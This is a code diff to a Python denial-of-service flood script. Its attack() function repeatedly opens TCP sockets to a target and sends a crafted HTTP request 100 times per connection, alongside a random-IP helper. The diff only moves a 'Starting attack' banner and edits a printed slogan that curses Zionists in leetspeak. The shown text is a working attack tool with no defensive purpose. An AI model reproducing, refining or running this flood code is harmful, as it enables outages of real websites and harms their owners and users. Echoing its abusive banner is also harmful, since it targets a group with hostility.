@@ -50,11 +50,11 @@ def randomip():
   return(randip)
 
 
-print("\033[48;5;5mFUCK 210N15T \033[32m \033[38;5;7mFREE PALESTINEand ")
+print("\033[48;5;5mFUCK 210N15T \033[32mand \033[38;5;7mFREE PALESTINE")
 
 
 time.sleep(1)
-
+print("\033[48;5;4mStarting attack \033[0m \033[38;5;2m" +str(url)+ " \033[91m0nfire..!!\033[0m")
 
 def attack():
   connection = "Connection: null\r\n"
@@ -66,7 +66,7 @@ def attack():
     try:
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
-      print("\033[48;5;4mStarting attack \033[0m \033[38;5;2m" +str(url)+ " \033[91m0nfire..!!\033[0m")
+      #star here
       for y in range(100):
           atk.send(str.encode(request))
     except socket.error:
